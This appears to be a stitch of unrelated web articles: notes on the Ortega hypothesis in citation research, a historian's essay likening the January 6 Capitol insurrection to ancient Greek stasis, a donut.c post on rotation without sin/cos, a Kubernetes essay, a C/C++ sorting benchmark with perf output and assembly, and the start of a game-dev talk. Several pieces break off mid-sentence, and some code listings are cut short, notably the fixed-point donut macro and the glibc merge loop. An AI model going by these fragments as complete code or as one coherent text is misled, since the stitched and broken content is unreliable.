<p>The Ortega hypothesis predicts that highly-cited papers and medium-cited (or lowly-cited) papers would equally refer to papers with a medium impact. The Newton hypothesis would be supported if the top-level research more frequently cites previously highly-cited work than that medium-level research cites highly-cited work. [From the Bornmann paper cited later]</p>
</blockquote>
<p>Or to state it in a more direct way: <em>Most science does not matter</em>, it is a small circle of elites of today that feeds into a small circle of elites in the future.</p>
<p>Cole &amp; Cole (<a href="https://science.sciencemag.org/content/178/4059/368.abstract">1972</a>) is the seminal examination of this question, which led to an entire literature around whether or not the Ortega hypothesis is true or not. They took the most cited paper from each of 84 physicists and looked at the work they cited. 60% of it was to researchers at "top nine" departments (Which comprise 21% of the entire population of physicists), 43% of citations were to researchers that themselves were highly (&gt;60) cited [in a given period of time], despite those being only 8% of all papers. 70% of citations were to researchers that have one or more honorific awards, despite them being 26% of all physicists.</p>
<p>They also replicated this in a larger sample, taking the top 10 papers most cited in <em>Physical Review</em>, they looked at the work cited by those; so take one of those papers, get all the cited authors, compute their total citations and see if this authors are disproportionately more cited than the average author; and they are. The same is true for not so highly cited papers, leading the authors to conclude that T<em>hese data offer further support for the hypothesis that even the producers of research of limited impact depend predominantly on the work produced by a relatively small elite.</em>. </p>
<blockquote>
<p>It seems, rather, that a relatively small number of physicists produce work that becomes the base for future discoveries in physics. We have found that even papers of relatively minor significance have used to a disproportionate degree the work of the eminent scientists.</p>
</blockquote>
<p>Nobel Prize winners, unsurprisingly are extremely well cited even before they get the award,</p>
<blockquote>
<p>The average number of citations in the 1961 SCI to the work of Nobel laureates (who won the prize in physics between 1955 and 1965) was 58, as compared with an average of 5.5 citations for other scientists. Only 1.08 percent of the quarter of a million scientists who appear in the 1961 SCI received 58 or more citations. We thought it possible that winning the prize might make a scientist more visible and lead to a greater number of postprize citations than the quality of his work warranted. We therefore divided the laureates into two groups: those who won the prize five or fewer years before 1961 and those who won it after that year. The 1957-1961 laureates were cited an average of 42 times in the 1961 SCI; the future prize winners (those winning the prize between 1961 and 1965), an average of 62 times. Since the prospective laureates were more often cited than the actual laureates, we concluded that the larger number of …</p></blockquote></div></div>

<p>So this week I want to talk about how what I know a historian influences how I am interpreting what I am going to call the Capitol Insurrection that happened on Wednesday, January 6 instead of taking the week off as I had originally planned. Since that is a really heavy topic, I am also going to do what I was <em>originally </em>planning to do this week,<strong> which was to share pictures of the two adorable little cats the Pedant-Household has adopted.</strong></p>



<p>They are named Oliver and Percival (Oliver after the knight from <em>The Song of Roland</em> and Percival after the knight from Arthurian legends, particularly Chretien de Troyes), and they are super-friendly and also oppose insurrectionists.</p>

<p>(Note that I have turned off comments for this post.  I know we all have opinions on this, often very strong opinions that others might find very frustrating.  I don’t particularly want to moderate that discussion and in any event, you are, at this point, much better off (if you are in the United States) <a href="https://youtu.be/KXXYkLa-HHI">Contacting Your Representatives</a> with your opinion, rather than arguing on the internet.)</p>



<p>We already talked, <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/">back in October</a>, about civil strife – <em>stasis</em> – in Greek communities and about how I thought that the United States has found itself in the early but accelerating stages of <em>stasis</em> as described by ancient Greek writers (I also worked in some Roman examples, but I really think the Greek parallel is more useful, as the fall of the Roman Republic was so heavily influenced by the involvement of the Roman Army; the United States military has played no such role, nor indicated it is interested in doing so.  For now, the civil-military relationship remains relatively healthy).</p>



<p>I’m going to assume you have all of that already, so if you want to go back and look at how I described <em>stasis</em> and what that meant, you may want to do that first.  Instead, I want to move forward and discuss what thinking in terms of <em>stasis</em> means in understanding the Capitol Insurrection and in particular the relevance of that Greek model of <em>stasis</em> in understanding both what has happened and what may need to happen going forward.  Starting with:</p>



<h2>This Was Serious</h2>



<p>While the insurrection was happening and in its immediate aftermath, there was a tendency to focus on the more frivolous, silly parts of it.  And there were truly silly looking things.  And there are still commentators – some deluded, some acting in bad faith – attempting to insist that this wasn’t serious.  <strong>They are wrong; the Capitol Insurrection was deadly serious</strong> both in the very literal sense that <em>people died</em> (which I think seems to be missed in some quarters), but also for what it means.  And, as time has passed and <a href="https://www.washingtonpost.com/dc-md-va/2021/01/14/dc-police-capitol-riot/?arc404=true">more reporting has been done</a> on <a href="https://twitter.com/CalebJHull/status/1348334770103660553">what was happening</a>, it has become increasingly apparent that we were perhaps <em>moments </em>away from mass-casualty events (either where politicians were taken by the mob or where the mob so endangered law enforcement or politicians that lethal force was required that would have left many insurrectionists dead).</p>



<p><strong>No ancient Greek would have had any trouble in understanding what happened on the 6th or that it was a serious attempt</strong> (albeit an incompetent one) <strong>to seize power</strong>.  Having a leader or a political faction move with a mob (often armed, but not always so) to<strong> try to disperse the normal civic assemblies of a Greek <em>polis</em> and occupy their normal meeting place was a standard maneuver to try to seize power during <em>stasis</em></strong>. As Dr. <a href="https://twitter.com/Roelkonijn">Roel Konijnendijk</a>, an ancient Greek history specialist, noted in this <a href="https://www.reddit.com/r/AskHistorians/comments/ks082p/meta_todays_sedition_at_the_united_states_capitol/giexmxe/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">excellent discussion</a> on the r/AskHistorians reddit (where he posts as Iphikrates), “In the Greek world, most attempts to seize power by force tended to take the same form: the seditious party would contrive an opportunity to gather in arms while their opponents were unarmed and off-guard, and seize control of all public spaces.”</p>



<p><strong>To take merely the examples in Athens</strong>, Cylon (the ‘c’ is hard, so Ki-lon – or if you prefer the Greek, Ku-lon – not Psi-lon) attempted it in 632, trying to seize the Athenian Acropolis with an armed mob (Thuc. 1.126; Hdt. 5.71; Plut. <em>Sol.</em> 12.1-2). Cylon’s effort failed in appropriately tragicomic fashion, with his supporters seeking shelter in the temple of Athena and only coming out with a cord that connected them to the altar and its notional protection (the cord breaks and they are all slain, Plut. <em>Sol</em>. 12).  Peisistratos also did it that way in Athens in 561 (Hdt. 1.59) using handpicked bodyguard that he armed with clubs, rather than spears; I cannot help but note just how many things we saw being used as clubs on the 6th. After the Pesistratids were thrown out, Isagoras attempted (with support from the Spartan king Cleomenes I) to institute an oligarchy the same way, seizing the Acropolis, but failing to take the Athenian <em>agora</em>; the Athenians rallied under the democratic leader Cleisthenes and besieged Cleomenes and Isagoras on the Acropolis (Hdt. 5.72; Arist. <em>Ath. Pol</em>. 20.1-4). Later in 411, the ‘Four Hundred’ would seize power in exactly the same way, arriving with a mob of armed supporters to disperse the Athenian <em>boule</em> – it’s council (Thuc. 8.69).  <strong>That’s four examples of this exact tactic from Athens alone</strong> (Athens was by no means the most <em>stasis</em>-prone ancient state, by the way – that was almost certainly Syracuse).</p>



<p>Moreover, <strong>One thing about coup attempts like this in the ancient world: they all look farcical, unless they work.</strong>  Peisistratos’ band of club-armed bodyguards would have looked terribly silly, except that they succeeded, for a time (put a pin in that, we’ll come back to it).  Peisistratos’ second attempt actually built support with something about as farcical as the <a href="https://www.bbc.com/news/world-us-canada-55606044">Q-Anon Shaman</a>, by riding into Athens on a chariot accompanied by a particularly tall woman dressed as Athena (Hdt. 1.60.2-5); the demonstration was taken by some as a sign of divine support. One assumes many Athenians thought it was laughable (Herodotus certainly does), but it was the precursor to another effort to seize power which also worked, albeit temporarily.</p>



<p>Just because it looks silly doesn’t mean it can’t work.  <strong>This was very serious</strong> and <strong>anyone pretending that ‘censorship’ on Twitter</strong> (a <em>private</em> platform, I thought these folks believed in markets?) <strong>or mean – but true – words from angry politicians is more consequential <em>than the violent attempt to seize the seat of government</em> is either a fool, an enemy, or both</strong> (though I will note that there is a world of difference between ‘fools’ and ‘enemies’ – fools may be persuaded and doing so is essential, see below.  We are all foolish at times; it is the cynics that get my dander up).</p>

<h2>This Is Not Over</h2>



<p>Let’s come back to Peisistratos, because he is instructive here.  Peisistratos tried to make himself tyrant of Athens <em><strong>twice</strong></em> before his third attempt succeeded. We’ve discussed his <strong>first attempt </strong>above (in 561), where Peisistratos attempted to use a club-armed bodyguard to seize the city (Hdt. 1.59); that worked, but he was overthrown in a counter-coup sometime after (Hdt. 1.60.1; this was not immediately though, Herodotus notes that Peisistratos had time to set government affairs, Hdt. 1.59.6).</p>



<p><strong>For the <em>second</em> attempt </strong>in 559, Peisistratos made a key alliance with Megacles – someone we might term an ‘establishment’ figure in the Athenian politics of the day, looking to get the edge on his rivals in the continuing Athenian <em>stasis</em> (Herodotus uses the very word, I should note). He was then brought into the city (the chariot bit above, Hdt. 1.60.2-5) and seized power <em>again</em>, with a mob of his supporters. This effort ends because Peisistratos offends Megacles and once his ally turns on him, he is exiled again (Hdt. 1.61.1-2).</p>



<p>But that wasn’t the end of the matter. Peisistratos, once out of power again used his wealth and support – often foreign support, we are told – to raise an army, hire mercenaries (Argives, Herodotus reports) and rally his supporters before storming back into Athens in 545 (Hdt. 1.16.3-4). Herodotus notes that a great flock of Peisistratos’ partisans from the city swarmed out to support him (this should sound more than a little familiar) and<strong> with that mix of mercenaries and mob he was able to catch the Athenians unprepared</strong> (Hdt. 1.63.1) and scattered them, then used a mix of misinformation (implying he intended no violence, Hdt. 1.63.2) and speed to seize the key parts of the city to keep the Athenians disorganized. And then he murdered or exiled all of his enemies (Hdt. 1.64.3) because that is what tyrants <em>do</em>, whatever they are assuring you about their peaceful intentions ahead of time. People who seize power with violence instead of with votes do not suddenly become pacifists when they win!</p>



<p>I don’t know what form the continuation of the trends that led to the Capitol Insurrection will take, if there will be further attempts at violent disruption in D.C. itself, or if we’ll see a shift to a campaign of domestic terror (something like <a href="https://en.wikipedia.org/wiki/The_Troubles">The Troubles</a>, in terms of the violence committed), or if, as with the Nazis after the failure of the <a href="https://en.wikipedia.org/wiki/Beer_Hall_Putsch">Beer Hall Putsch</a>, the folks who supported this insurrection will focus on trying to use the democratic process to abolish the democratic process.  <strong>But this is not over</strong>.  There is abundant polling evidence that among a minority of Americans (but a plurality or majority of Republicans; we’ll come back to that) support for the lies (that the election was fraudulent, <em><a href="https://factcheck.thedispatch.com/p/fact-check-debunking-donald-trumps">which it wasn’t</a></em>; the liars were <a href="https://beta.documentcloud.org/documents/20423518-trump_case_decision">given plenty of chances to provide any evidence at all</a> for their lies and they didn’t) remains high.  As in 545, a great many Americans still support Peisistratos.  Some smaller subset of them have bought into messianic conspiracy theories like Q-Anon which fairly transparently could lead to considerable violence. <strong> The underlying conditions that made the tyrannical attempt possible still exist</strong>, so we should expect …</p></div></div>

  <p>My little <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">donut.c</a> has
 been making the rounds
again, after being featured in a couple YouTube videos (e.g., <a href="https://www.youtube.com/watch?v=DEqXNfs_HhY">Lex
Fridman</a> and <a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Joma
Tech</a>).  If I had known how much
attention this code would get over the years, I would have spent more time on
it.</p>

<p>One thing that’s always been sort of unfortunate is the heavy use of <code>sin</code> and
<code>cos</code> – both because it necessitates linking the math library (<code>-lm</code>), but
also because it makes it much more CPU-intensive than it really needs to be.
This is especially apparent if you try to port it to an <a href="https://twitter.com/chainq/status/1297178062937825280">older
CPU</a> or an <a href="https://twitter.com/enjoy_digital/status/1341095343816118272">embedded

<p>So, here’s a revised version with no use of <code>sin</code>, <code>cos</code>, and no need for
linking the math library (though this version still does use <code>float</code> types).</p>

<p>It’s a little misshapen and still has comments at the bottom. I used the first
frame of its output as a template and there’s <em>slightly</em> less code than filled
pixels – oh well. Output is pretty much the same as before:</p>


<pre id="d"></pre>



<p>So, how do we get sines and cosines without using <code>sin</code> and <code>cos</code>? Well, the
code doesn’t really <em>need</em> sine and cosine <em>per se</em>; what it actually does is
rotate a point around the origin in two nested loops, and also rotate two
angles just for the animation. If you’ll recall from the other article, the
inner loop is just plotting dots in a circle, which goes around another, larger
circle. In each loop, the sine/cosine terms are just moving by a small, fixed
angle.</p>

<p>So we don’t need to track the <em>angle</em> at all, we only need to start at cos=1,
sin=0 and rotate a circle around the origin to generate all the sines and
cosines we need. We just have to repeatedly apply a fixed rotation matrix:</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \begin{bmatrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>So for example, if we were to use an angle of .02 radians in our inner loop, it would look something like:</p>
<div><div><pre><code><span>float</span> <span>c</span><span>=</span><span>1</span><span>,</span> <span>s</span><span>=</span><span>0</span><span>;</span>  <span>// c for cos, s for sin</span>
<span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>314</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>  <span>// 314 * .02 ~= 2π</span>
  <span>// (use c, s in code)</span>
  <span>float</span> <span>newc</span> <span>=</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>c</span> <span>-</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>s</span><span>;</span>
  <span>s</span> <span>=</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>c</span> <span>+</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>s</span><span>;</span>
  <span>c</span> <span>=</span> <span>newc</span><span>;</span>
<span>}</span>
</code></pre></div></div>



<p>That works, but there’s a problem: no matter how precisely we define our
constants, after repeated iteration of this procedure, the magnitude of our \(\left(c, s\right)\) vector will exponentially grow or shrink over time. If we
only need to make one pass around the loop, maybe we can get away with that,
but if we have to make several (for the rotating animation, we do), we need to
fix that.</p>

<p><img src="https://www.a1k0n.net/img/sincos-mag.png" alt="sine and cosine magnitude creep"><br>
<em>an exaggerated illustration of what happens when repeatedly doing low-precision rotations</em></p>

<p>The simplest way to do that would be to multiply \(c\) and \(s\) by \(1/\sqrt{c^2 + s^2}\), but then we’re back to using the math library again. Instead, we can take
advantage of the fact that our magnitude starts out very close to 1, and we’re
going to be iterating this procedure: we can do a <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton
step</a> after each rotation, and
that will be enough to keep the magnitude “close enough” to 1 over time.</p>

<p>Our goal is to find the reciprocal square root (<a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">sound
familiar?</a>) of \(a =
c^2 + s^2\), our \(\left(c, s\right)\) vector magnitude.  Say we define a
function \(f(x) = \frac{1}{x^2} - a\). The function is 0 when \(x =
\frac{1}{\sqrt{a}}\). We can start with an initial guess of 1 for <em>x</em>,
perform a Newton iteration to obtain <em>x’</em>, which will be “closer to”
\(\frac{1}{\sqrt{a}}\), the correct value to scale <em>c</em> and <em>s</em> by so that their
magnitude \(c^2 + s^2\) is “close to” 1 again.</p>

<p>A Newton step is defined as \(x' = x - \frac{f(x)}{f'(x)}\). I used
<a href="https://www.sympy.org/">SymPy</a> to do the derivative and simplification and
came up with \(x' = \frac{x\left(3 - a x^2\right)}{2}\). Since we’re only doing
one step, we can plug in our initial guess of 1 for \(x\) and back-substitute
\(c^2 + s^2\) for \(a\) to finally get our adjustment: \(x' = (3 - c^2 - s^2)/2\).</p>



<p>But now that we don’t have to worry so much about the magnitude of our result
(within limits), we can take another shortcut (I got this idea studying old
<a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> algorithms).  If we divide out
the cosines from our original rotation matrix, we get</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \frac{1}{\cos \theta}\begin{bmatrix}
1 &amp; -\tan \theta \\
\tan \theta &amp; 1
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>using the trig identity \(\tan \theta = \frac{\sin \theta}{\cos \theta}\).
Since we’re only dealing with small angles, the leading \(\frac{1}{\cos
\theta}\) term is close enough to 1 that we can ignore it and have our Newton
step take care of it.</p>

<p>And now we can finally understand how the rotation is done in the code. Towards
the top of the donut code is this #define, which I’ve reindented:</p>

<div><div><pre><code><span>#define R(t,x,y) \ 
</span>  <span>f</span> <span>=</span> <span>x</span><span>;</span> \
  <span>x</span> <span>-=</span> <span>t</span><span>*</span><span>y</span><span>;</span> \
  <span>y</span> <span>+=</span> <span>t</span><span>*</span><span>f</span><span>;</span> \
  <span>f</span> <span>=</span> <span>(</span><span>3</span><span>-</span><span>x</span><span>*</span><span>x</span><span>-</span><span>y</span><span>*</span><span>y</span><span>)</span><span>/</span><span>2</span><span>;</span> \
  <span>x</span> <span>*=</span> <span>f</span><span>;</span> \
  <span>y</span> <span>*=</span> <span>f</span><span>;</span>
</code></pre></div></div>

<p>This does an in-place rotation of a unit vector <code>x, y</code> where <code>t</code> is \(\tan
\theta\). <code>f</code> is a temporary variable; the first three lines do the “matrix
multiplication” on <code>x, y</code>. <code>f</code> is then re-used to get the magnitude adjustment,
and then finally <code>x</code> and <code>y</code> are multiplied by <code>f</code> which moves them back onto
the unit circle.</p>

<p>With that operation in hand, I just replaced all the angles with their sines
and cosines and ran the rotation operator <code>R()</code> instead of calling <code>sin</code>/<code>cos</code>.
The code is otherwise identical.</p>



<p>We can use exactly the same ideas with integer fixed-point arithmetic, and not
use any <code>float</code> math whatsoever. I’ve redone all the math with 10-bit precision
and produced the following C code which runs well on embedded devices which can
do 32-bit multiplications and have ~4k of available RAM:</p>

<div><div><pre><code><span>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span>#define R(mul,shift,x,y) \
  _=x; \
  x -= mul*y&gt;&gt;shift; \
  y += mul*_&gt;&gt;shift; \
  _ = 3145728-x*x-y*y&gt;&gt;11; \
  x = x*_&gt;&gt;10; \
  y = y*_&gt;&gt;10;

<article>
  <p><em>Pankaj Kumar</em></p>

<p><strong>Encapsulation in Kubernetes</strong></p>

<p>In 2018, for various reasons we moved our website to Kubernetes. When we started, we had little idea what Kubernetes had to offer. All we knew was that it can run a website based on containers that are full OS images. It is easier to move from one cloud provider to another. Cool! Little did we know the biggest advantage it offers: Encapsulation.</p>

<p>The biggest advantage of Kubernetes in my opinion is the encapsulation and composability of backend components. Any Saas product has to run a number of components from database, appserver, monitoring stack, pub/sub etc etc. Kubernetes makes everything a helm chart and some configuration away. The interfaces are neatly defined by the author of the helm chart and all the complexity is encapsulated well within a service. You could use many third party helm charts:
Monitoring: logging - Elasticsearch
Monitoring: metrics - Prometheus
Authentication - FusionAuth
Database - MongoDB
Chaos Monkey - Gremlin
CD - Argo
…
This abstraction of complexity lets every team focus on its unique IP and easily reuse third party components. Now why was it not possible before? VM images were too big, needed a lot of time to boot and it was hard to maintain a lot of them.</p>

<p>Composability is not just limited to third party components. Even your own code becomes very composable with well defined interfaces. Now how should we decide the boundary between two components in a Kubernetes cluster? The same priciples that apply in designing a database or paritioning a program to classes is useful here but with slightly different parameters. When we decide what should go into a class, we use the priciple of loose coupling and strong cohesion: The interface between classes
should be simple and the complexity can be captured inside the class. Also, strong cohesion means methods and properties inside the class should be related to each other: they should change together. A change in behavior should as much as possible be confined within the class.</p>

<p>Choosing the boundary of Kubernetes components depends on a few things apart from the Simplicity of the interface: 
Single process: Everything in one component should run as a single process/container. It should have the same dependencies. You dont really have to worry about this because you pretty much have little choice.
Configurability of the component: IF a configuration change requires the restart of certain parts, they should be in the same component.
Auto-scaling policies for the component. If one component is CPU bound and needs CPU scaling whereas other needs Memory based autoscaling, they should be in different components.
We should strive to decouple state of the containers from the runtime as much as possible, by using databases and volume claims. But ideally one component should not have too many different types of state.</p>

<p>It can also be thought of as taking a UML component diagram and giving each component a container of its own. The concept of components in UML closely resembles an image.</p>

<p>Now, let’s say someday that the component configuration is super easy and the  configuration/maintenance of these components rests in the hands of the creator of the component itself (for a fee of course).  The frontend app developer would go hire some of these backend components, configure them together and a new app is ready to run! The road will not be easy but this will be true low-code where complex services can be built by just knowing UI programming.</p>

  <div itemprop="articleBody">
    <p>Recently, Daniel Lemire <a href="https://lemire.me/blog/2019/05/07/almost-picking-n-distinct-numbers-at-random/">tackled the topic</a> of selecting N <em>distinct</em> numbers at random. In the case we want sorted output, an obvious solution presents itself: sorting randomly chosen values and de-duplicating the list, which is easy since identical values are now adjacent.<sup id="fnref:distinct" role="doc-noteref"><a href="#fn:distinct">1</a></sup></p>

<p>While Daniel suggests a clever method of avoiding a sort entirely<sup id="fnref:danmethod" role="doc-noteref"><a href="#fn:danmethod">2</a></sup>, I’m also interested in they <em>why</em> for the underlying performace of the sort method: it takes more than 100 ns per element, which means 100s of CPU clock cycles and usually even more instructions than that (on a superscalar processor)! As a sanity check, a quick benchmark (<code>perf record ./bench &amp;&amp; perf report</code>) shows that more than 90% of the time spent in this approach is in the sorting routine, <a href="https://devdocs.io/c/algorithm/qsort">qsort</a> - so we are right to focus on this step, rather than say the de-duplication step or the initial random number generation. This naturally, this raises the question: how fast is qsort when it comes to sorting integers and can we do better?</p>

<p>All of the code for this post <a href="https://github.com/travisdowns/sort-bench">is available on GitHub</a>, so if you’d like to follow along with the code open in an editor, go right ahead (warning: there are obviously some spoilers if you dig through the code first).</p>

<h2 id="benchmarking-qsort">Benchmarking Qsort</h2>

<p>First, let’s take a look at what <code>qsort</code> is doing, to see if there is any delicous low-hanging performance fruit. We use <code>perf record ./bench qsort</code> to capture profiling data, and <code>perf report --stdio</code> to print a summary<sup id="fnref:long-tail" role="doc-noteref"><a href="#fn:long-tail">3</a></sup>:</p>

<div><div><pre><code># Samples: 101K of event 'cycles:ppp'

<p>The assembly for the biggest offender, <code>msort_with_tmp</code> looks like this<sup id="fnref:annotate-command" role="doc-noteref"><a href="#fn:annotate-command">4</a></sup> :</p>

<div><div><pre><code> Percent | Address      | Disassembly
--------------------------------------------------
   30.55 :   39200:       mov    rax,QWORD PTR [r15]

</code></pre></div></div>

<p>Depending on your level of assembly reading skill, it may not be obvious, but this is basically a classic merge routine: it is merging two lists by comparing the top elements of each list (pointed to by <code>r13</code> and <code>r15</code>), and then storing the smaller element (the line <code>QWORD PTR [rbx],rax</code>) and loading the next element from that list. There are also two checks for termination (<code>test   r12,r12</code> and <code>test   rbp,rbp</code>). This hot loop corresponds directly to this code from <code>glibc</code> (from the file<code>msort.c</code><sup id="fnref:msort-note" role="doc-noteref"><a href="#fn:msort-note">5</a></sup>) :</p>

<div><div><pre><code><span>while</span> <span>(</span><span>n1</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>n2</span> <span>&gt;</span> <span>0</span><span>)</span>

        <span>b1</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n1</span><span>;</span>
    <span>}</span>
    <span>else</span>
    <span>{</span>
        <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>tmp</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>b2</span><span>;</span>
        <span>b2</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n2</span><span>;</span>
    <span>}</span>
    <span>tmp</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This loop suffers heavily from branch mispredictions, since the “which element is larger” branch is highly unpredictable (at least for random-looking input data). Indeed, we see roughly 128 million mispredicts while sorting ~11 million elements: close to 12 mispredicts per element.</p>

<p>We also note the presence of the indirect call at the <code>call r14</code> line. This corresponds to the <code>(*cmp) (b1, b2, arg)</code> expression in the source: it is calling the user provided comparator function through a function pointer. Since the <code>qsort()</code> code is compiled ahead of time and is found inside the shared libc binary, there is no chance that the comparator, passed as a function pointer, can be inlined.</p>

<p>The comparator function I provide looks like:</p>

<div><div><pre><code><span>int</span> <span>compare_uint64_t</span><span>(</span><span>const</span> <span>void</span> <span>*</span><span>l_</span><span>,</span> <span>const</span> <span>void</span> <span>*</span><span>r_</span><span>)</span> <span>{</span>
    <span>uint64_t</span> <span>l</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>l_</span><span>;</span>
    <span>uint64_t</span> <span>r</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>r_</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&lt;</span> <span>r</span><span>)</span> <span>return</span> <span>-</span><span>1</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&gt;</span> <span>r</span><span>)</span> <span>return</span>  <span>1</span><span>;</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>which on gcc compiles to branch-free code:</p>

<div><div><pre><code>mov    rax,QWORD PTR [rsi]
mov    edx,0xffffffff
cmp    QWORD PTR [rdi],rax
seta   al
movzx  eax,al
cmovb  eax,edx
ret
</code></pre></div></div>

<p>Note that the comparator has to redundantly load from memory the two locations to compare, something the merge loop already did (the merge loop reads them because it is responsible for moving the elements).</p>

<p>How much better could things get if we inline the comparator into the merge loop? That’s what we do in <code>qsort-inlined</code><sup id="fnref:inline-hard" role="doc-noteref"><a href="#fn:inline-hard">6</a></sup>, and here’s the main loop which now includes the comparator function<sup id="fnref:cmdline1" role="doc-noteref"><a href="#fn:cmdline1">7</a></sup> :</p>

<pre><code> 0.07 :   401dc8:       test   rbp,rbp
 0.66 :   401dcb:       je     401e0c &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0xbc&gt;
 3.51 :   401dcd:       mov    rax,QWORD PTR [r9]
 5.00 :   401dd0:       lea    rdx,[rbx+0x8]
 1.62 :   401dd4:       mov    rcx,QWORD PTR [rbx]
 0.24 :   401dd7:       lea    r8,[r9+0x8]
 6.96 :   401ddb:       cmp    rax,rcx
20.83 :   401dde:       cmovbe r9,r8
 8.88 :   401de2:       cmova  rbx,rdx
 0.27 :   401de6:       cmp    rcx,rax
 6.23 :   401de9:       sbb    r8,r8
 0.74 :   401dec:       cmp    rcx,rax
 4.93 :   401def:       sbb    rdx,rdx
 0.24 :   401df2:       not    r8
 6.69 :   401df5:       add    rbp,rdx
 0.44 :   401df8:       cmp    rax,rcx
 5.34 :   401dfb:       cmova  rax,rcx
 5.96 :   401dff:       add    rdi,0x8
 7.48 :   401e03:       mov    QWORD PTR [rdi-0x8],rax
 0.00 :   401e07:       add    r15,r8
 0.71 :   401e0a:       jne    401dc8 &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0x78&gt;
</code></pre>

<p>A key difference is that the core of the loop is now branch free. Yes, there are still two conditional jumps, but they are both just checking for the termination condition (that one of the lists to merge is exhausted), so we expect this loop to be free of branch mispredictions other than the final iteration. Indeed, we measure with <code>perf stat</code> that the misprediction rate has dropped from to close to 12 mispredicts per element to around 0.75 per element. The loop has only two loads and one store, so the memory access redundancy between the merge code and the comparator has been eliminated<sup id="fnref:load-redundancy" role="doc-noteref"><a href="#fn:load-redundancy">8</a></sup>. Finally, the comparator does a three-way compare (returning distrinct results for <code>&lt;</code>, <code>&gt;</code> and <code>==</code>), but the merge code only needs a two-way compare (<code>&lt;=</code> or <code>&gt;</code>) - inlining the comparator manages to remove extra code associated with distinguishing the <code>&lt;</code> and <code>==</code> cases.</p>

<p>What’s the payoff? It’s pretty big:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig2.svg" alt="Effect of comparator inlining"></p>

<p>The speedup hovers right around 1.77x. Note that this is much larger than simply eliminating all the time spent in the separate comparator function in the original version (about 17% of the time implying a speedup of 1.2x if all the function time disapeared). This is a good example of how inlining isn’t just about removing function call overhead but enabling further <em>knock on</em> optimizations which can have a much larger effect than just removing the overhead associated with function calls.</p>

<h2 id="what-about-c">What about C++?</h2>

<p>Short of copying the existing glibc (note: LGPL licenced) sorting code to allow inlining, what else can we do to speed things up? I’m writing in C++, so how about the C++ sort functions available in the <code>&lt;algorithm&gt;</code> header? Unlike C’s <code>qsort</code> which is generic by virtue of taking a function pointer and information about the object size, the C++ sort functions use templates to achieve genericity and so are implemented directly in header files. Since the sort code and the comparator are being compiler together, we expect the comparator to be easily inlined, and perhaps other optimizations may occur.</p>

<p>Without further ado, let’s just throw <code>std::sort</code>, <code>std::stable_sort</code> and <code>std::partial_sort</code> into the mix:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig3.svg" alt="C vs C++ sort functions"></p>

<p>The C++ sort functions, other than perhaps <code>std::partial_sort</code><sup id="fnref:partial-sort" role="doc-noteref"><a href="#fn:partial-sort">9</a></sup>, put in a good showing. It is interesting that <code>std::stable_sort</code> which has <em>stricly more requirements</em> on its implementation than <code>std::sort</code> (i.e., any stable sort is also suitable for <code>std::sort</code>) ends up faster. I re-wrote this paragaph several times, since sometimes after a reboot <code>stable_sort</code> was slower and sometimes it was faster (as shown above). When it was “fast” it had less than 2% branch mispredictions, and when it was slow it was at 15%. So perhaps there was some type of aliasing issue in the branch predictor which depends on the physical addresses assigned, which can vary from run to run, I’m not sure. See <sup id="fnref:stablesort" role="doc-noteref"><a href="#fn:stablesort">10</a></sup> for an old note from when <code>std::stable_sort</code> was slower.</p>

<h2 id="can-we-do-better">Can we do better?</h2>

<p>So that’s as fast as it gets, right? We aren’t going to beat <code>std::sort</code> or <code>std::stable_sort</code> without a huge amount of effort, I think? After all, these are presumably highly optimized sorting routines written by the standard library implementors. Sure, we might expect to be able to beat <code>qsort()</code>, but that’s mostly because of built-in disadvantages that <code>qsort</code> has, lacking the ability to inline the comparator, etc.</p>

<h3 id="radix-sort-attempt-1">Radix Sort Attempt 1</h3>

<p>Well, one thing we can try is a non-comparison sort. We know we have integer keys, so why stick to comparing …</p></div></article></div></div></div>

<div><p>Finally, almost 3 months after it released, I can stop thinking about Gutwhale.</p><p>
<em>This is the edited script of a talk I gave for the Game Dev Days 2020.</em></p></div>

<h2>the endless gamejam</h2>

<div><p>A few years ago I only did gamejams.<br> 
Gamejams are essentially deadlines, forcing you finish something. <br>
